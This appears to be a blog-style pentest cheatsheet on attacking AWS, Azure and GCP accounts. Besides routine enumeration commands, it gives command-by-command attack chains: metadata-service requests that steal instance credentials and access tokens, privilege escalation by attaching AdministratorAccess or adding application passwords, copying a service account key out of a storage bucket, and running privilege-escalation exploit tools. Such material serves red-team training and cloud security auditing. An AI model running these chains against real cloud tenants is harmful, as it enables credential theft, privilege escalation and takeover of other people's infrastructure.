---
layout: post
title: Cloud Notes
date: 2024-08-01
tags: [Cloud, Cheatsheet]
---

# Cloud

### AWS

```bash
# IAM Login
https://console.aws.amazon.com/
# SSO Login
https://Org-Name.awsapps.com/start

# Programmatic Access (CLI)
$ aws configure --profile atomic-nuclear
AWS Access Key ID: [fill in]
AWS Secret Access Key: [fill in]

# Get information about configured identity
$ aws sts get-caller-identity --profile atomic-nuclear

# AWS CLI Stored Credentials Location
C:\Users\UserName\.aws
/home/UserName/.aws

# Enumeration
# Users
$ aws iam list-users
$ aws iam list-groups-for-user --user-name [user-name]
$ aws iam list-attached-user-policies --user-name [user-name]
$ aws iam list-user-policies --user-name [user-name]
# Groups
$ aws iam list-groups 
$ aws iam get-group --group-name [group-name]
$ aws iam list-attached-group-policies --group-name [group-name]
$ aws iam list-group-policies --group-name [group-name]
# Roles
$ aws iam list-roles 
$ aws iam list-attached-role-policies --role-name [role-name]
$ aws iam list-role-policies --role-name [role-name]
# Policies
$ aws iam list-policies 
$ aws iam get-policy --policy-arn [policy-arn]
$ aws iam list-policy-versions --policy-arn [policy-arn]
$ aws iam get-policy-version --policy-arn policy-arn --version-id [version-id]
$ aws iam get-user-policy --user-name user-name --policy-name [policy-name]
$ aws iam get-group-policy --group-name group-name --policy-name [policy-name] 
$ aws iam get-role-policy --role-name role-name --policy-name [policy-name]

# Configure Initial Compromised User Credentials
$ aws configure --profile auditor 

# Enumerate Cloud Services in an Organization AWS Account
$ aws ec2 describe-instances --profile auditor

# Exploit Public Facing Application Running on EC2 instance and Retrieve Temporary Credentials
$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/jump-ec2-role

# Configure and Validate Temporary Credential in AWS CLI
$ aws configure set aws_access_key_id [key-id] --profile ec2
$ aws configure set aws_secret_access_key [key-id] --profile ec2
$ aws configure set aws_session_token [token] --profile ec2
$ aws sts get-caller-identity --profile ec2

# Get the Managed Policy Attached to EC2 Instance
$ aws iam list-attached-role-policies --role-name jump-ec2-role --profile 
auditor

# Retrieves the specified inline policy document that is embedded on the ec2 instance role
$ aws iam list-role-policies --role-name jump-ec2-role --profile auditor

# Get the permissions in inline policy 
$ aws iam get-role-policy --role-name jump-ec2-role --policy-name jump-inline-policy --profile auditor

# Escalate privilege by attaching administrator policy to itself 
$ aws iam attach-role-policy --policy-arn  arn:aws:iam::aws:policy/AdministratorAccess --role-name jump-ec2-role --profile ec2

# Again, check the managed Policy Attached to EC2 Instance
$ aws iam list-attached-role-policies --role-name jump-ec2-role --profile auditor
```

##### Using Automated Tool `pacu`

```bash
$ sudo apt install pacu -y
$ pacu
pacu> set_keys
# List all modules
pacu> ls
# Run an AWS CLI command directly.
pacu> aws <command>
# Assume role as another user.
pacu> assume_role arn:aws:iam::ACCOUNTIDHERE:role/u-roleName
# Set region to prevent bruteforce
pacu> set_regions ap-southeast-1 # Singapore
# Execute a module
pacu> run/exec <module name>
# Get the permission of current logged-in user 
pacu> exec iam__enum_permissions whoami
# Enumerate ec2 instance and get the public ip addresses
pacu> exec ec2__enum data EC2
# Enumerate privilege escalation permission and exploit it 
pacu> exec iam__privesc_scan
```

##### Using automated tool `prowler`

```bash
$ git clone https://github.com/prowler-cloud/prowler
$ cd prowler
$ poetry shell
$ poetry install

AWS Dashboard> Click on Access Key and copy the aws_access_key_id, aws_secret_access_key and aws_session_token
# Export Access Key into local environment variable and put (any) assumerole information into local config folder
$ cd ~/.aws/
$ cat config
[profile testprofile]
role_arn = arn:aws:iam::123456789012:role/testrole
credential_source = Environment
$ python3 prowler.py aws -R arn:aws:iam::accountID:role/roleName
```

##### Using automated tool `cloudfox`

```bash
# https://github.com/BishopFox/cloudfox
$ cloudfox aws --profile [profile-name] all-checks
```

### Azure

```powershell
# Microsoft Graph API Endpoint 
{HTTP method} https://graph.microsoft.com/{version}/{resource}?{query-parameters}

# Azure Resource Manager API Endpoint
{HTTP method} https://management.azure.com/{version}/{resource}?{query-parameters} 

# Office 365 Management Access
# O365 / M365 Admin Center [Web Portal]
https://admin.microsoft.com
https://portal.microsoft.com

# O365 / M365 User Portal
https://office.com/

# O365 API : [management, outlook and other applications]
{HTTP method} https://*.office.com/{version}/{resource}?{query-parameters}

# Azure Portal URL
https://portal.azure.com/

# Authentication 
PS> az login
PS> az login --service-principal -u <ApplicationID> -p <Password> --tenant <TenantID>
PS> Connect-AzAccount
PS> $cred = Get-Credential # [User=Application ID & Password=ClientSecret]
PS> Connect-AzAccount -ServicePrincipal -Tenant TentantID -Credential $cred
# Authentication using Access Token
PS> az account get-access-token --resource=https://management.azure.com 
PS> Connect-AzAccount -AccessToken <AADAccessToken>

# Authentication using Username + Password
PS> Connect-MgGraph -Scopes "Directory.Read.All"
PS> Connect-MgGraph -AccessToken ($token | ConvertTo-SecureString -AsPlainText -Force)

# Enumeration
# Check if target organization is using Entra ID as a IDP [Identity Provider] 
https://login.microsoftonline.com/getuserrealm.srf?login=Username@DomainName&xml=1
# Get currently logged-in session information 
PS> Get-MgContext
# Get a list of all directory roles
PS> Get-MgDirectoryRole | ConvertTo-Json 
# Get a list of members of a directory roles
PS> Get-MgDirectoryRoleMember -DirectoryRoleId [Directory RoleID] -All | 
ConvertTo-Json
# Get a lists of users in Entra ID
PS> Get-MgUser
# Get a list of group, specified member part of 
PS> Get-MgUserMemberOf -UserId [UserID]
# Get a lists of all groups in Entra ID
PS> Get-MgGroup 
# Get a list of members of a group 
PS> Get-MgGroupMember -GroupId [GroupID] | ConvertTo-Json
# Get the list of all applications.
PS> Get-MgApplication 
# Get the details about a specific applications
PS> Get-MgApplication -ApplicationId [ApplicationObjectID] | ConvertTo-Json
# Get the detail about owner of the specified applications
PS> Get-MgApplicationOwner -ApplicationId [ApplicationObjectID] | ConvertTo-Json
# Get the details about application permission for an application
PS> $app= Get-MgApplication -ApplicationId [ApplicationObjectID]
PS> $app.RequiredResourceAccess
# Get the details of App Role for Microsoft Graph API
PS> $res=Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
PS> $res.AppRoles | Where-Object {$_.ID -eq 'AppRoleID’} | ConvertTo-Json}
# Get the details about delegation permission for an application
PS> $app= Get-MgApplication -ApplicationId [ApplicationObjectID]
PS> $app.Oauth2RequirePostResponse | ConvertTo-Json
# Get details about currently logged in session 
PS> az account show
# Get the list of all available subscriptions
PS> az account list --all 
# Get the details of a subscription 
PS> az account show -s Subscription-ID/Name 
# Get the list of available resource group in current subscription
PS> az group list -s Subscription-ID/Name
# Get the list of available resource group in a specified subscription 
PS> az group list -s Subscription-ID/Name
# Get the list of available resources in a current subscription
PS> az resource list 
# Get the list of available resources in a specified resource group 
PS> az resource list --resource-group ResourceGroupName
# Lists of roles assigned in specified subscription. 
PS> az role assignment list --subscription Subscription-ID/Name 
# Lists of roles assigned in current subscription and inherited 
PS> az role assignment list -all
# List of all roles assigned to an identity [user, service principal, identity] 
PS> az role assignment list --assignee ObjectID/Sign-InEmail/ServicePrincipal --all
# Lists of roles with assigned permission
PS> az role definition list 
# Get the full information about a specified role 
PS> az role definition list -n RoleName 
# Lists of custom role with assigned permissions 
PS> az role definition list --custom-role-only 

# Login to Az CLI with Initial Compromised User Credential 
PS> az login 
PS> az account list

# Login to Mg Graph Powershell CLI with Initial Compromised User Credential 
PS> Connect-MgGraph -Scopes "Directory.Read.All"
PS> Get-MgContext
# Login to Mg Graph Powershell CLI with access token
PS> az account get-access-token --resource https://graph.microsoft.com
PS> Connect-MgGraph -AccessToken [TOKEN]
# Get the User ID of “auditor” user 
PS> Get-MgUser -Filter "startswith(displayName,'auditor')"
# List of all objects owned by logged-in user
PS> Get-MgUserOwnedObject -UserId [UserID] | ConvertTo-Json
# Get an application object id & app id 
PS> Get-MgApplication -Filter "startswith(displayName,'prod-app')"
# Get a list of all application in Entra ID Tenant 
PS> Get-MgApplicationOwner -ApplicationId "AppObjectID" | ConvertTo-Json
# As an app owner, create an application credential. 
PS> Add-MgApplicationPassword -ApplicationId "AppObjectID" | ConvertTo-Json
# Get the required resource access to specific App
PS> $app= Get-MgApplication -ApplicationId [AppObjectID]
PS> $app.requiredResourceAccess | ConvertTo-Json
# Check the directory role assigned to prod application.
PS> Get-MgDirectoryRolememberasServicePrincipal -DirectoryRoleId 
664f8b57-19df-4893-91f2-6657c3d27b5c | ConvertTo-json
# Find Role value
PS> $res=Get-MgServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'"
PS> $res.AppRoles | Where-Object {$_.ID -eq '[RoleId]'} | ConvertTo-Json

# Get all the role assignment “auditor” user have on azure subscription 
PS> az role assignment list --assignee 'auditor@atomic-nuclear.site' --all
# Enumerate VM Instance and it’s public ip address 
PS> az vm list
PS> az vm list-ip-addresses --name prod-vm --resource-group PROD-RG
# Exploit public facing application and retrieve access token of managed identity attached to vm
PS> curl -H "Metadata:true" "http://website/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
PS> curl -H "Metadata:true" "http://website/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
# Configure access token in az powershell cli 
PS> $token = “AccessToken”
PS> Connect-AzAccount -AccessToken $token -AccountId [Subscription ID]
# Now Check Again, role assignment of managed identity attached to vm 
PS> Get-AzRoleAssignment -ObjectId [PrincipalID-ManagedIdentity]
```

### GCP

```powershell
# Authentication
PS> gcloud auth login
# Get the information about authenticated accounts with gcloud
PS> gcloud auth list 
# Login with Service Account
PS> gcloud auth activate-service-account --key-file KeyFile
# Stored Credentials on Windows
PS> ls C:\Users\UserName\AppData\Roaming\gcloud\
# Stored Credentials on Linux
$ ls /home/UserName/.config/gcloud/
# Content of Stored Google Cloud CLI Secrets 
Database : access_tokens.db : 
 Table: access_tokens 
 Columns : account_id, access_token, token_expiry, rapt_token 
Database : credentials.db : 
 Table: credentials 
 Columns: account_id, value

# Enumeration
PS> gcloud auth list 
PS> gcloud config list
PS> gcloud organizations list
PS> gcloud organizations get-iam-policy [OrganizationID]
PS> gcloud projects list
PS> gcloud projects get-iam-policy [ProjectID]
PS> gcloud iam service-accounts list 
PS> gcloud iam service-accounts get-iam-policy [Service Account Email ID]
PS> gcloud iam service-accounts keys list --iam-account [service Account Email ID]
PS> gcloud iam roles list
PS> gcloud iam roles describe [roles/owner]
PS> gcloud iam roles list --project [alert-nimbus-335411]
PS> gcloud iam roles describe [RoleName] --project [alert-nimbus-335411]

# Automated Enumeration
$ git clone https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum
$ ./gcp_enum.sh

# Configure Initial Compromised Service Account Credential
PS> gcloud auth activate-service-account --key-file 
PS> alert-nimbus-335411-4ee19bc40a65.json
# Enumerate Cloud Services, e.g IAM, VM, Storage etc. in an Organization Google Cloud Account
PS> gcloud projects get-iam-policy alert-nimbus-335411 
PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:auditor@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
PS> gcloud compute instances list
# Exploit Public Facing Application Running on VM and Retrieve Access Token
PS> curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/233003792018-compute@developer.gserviceaccount.com/token
# Save the access token in text file & Validate it by retrieving projects information.
PS> gcloud projects list --access-token-file token.txt
# Get the IAM Policy for service aoccunt which is attached to compute instance
PS> gcloud projects get-iam-policy alert-nimbus-335411
PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:233003792018-compute@developer.gserviceaccount.com" --format="value(bindings.role)"
# Exfiltrate the credential stored in gcp cloud storage using compute default service account credential 
PS> gcloud storage ls --access-token-file token.txt
PS> gcloud storage ls gs://devops-storage-metatech --access-token-file token.txt
PS> gcloud storage cp gs://devops-storage-metatech/devops-srvacc-key.json . --access-token-file token.txt
# Again, authenticate to gcloud cli with new sa key and retrieve it’s iam policy 
PS> gcloud auth activate-service-account --key-file devops-srvacc-key.json
PS> gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:devops-service-account@alert-nimbus-335411.iam.gserviceaccount.com" --format="value(bindings.role)"
```

##### Automated PrivEsc Tool

```bash
$ git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
# Identity possible privilege escalation ways in gcp project
$ python3 PrivEscScanner/enumerate_member_permissions.py -p alert-nimbus-335411
$ python3 PrivEscScanner/check_for_privesc.py
# Exploit identified misconfigured iam permission for privilege escalation
$ python3 ExploitScripts/iam.roles.update.py
```

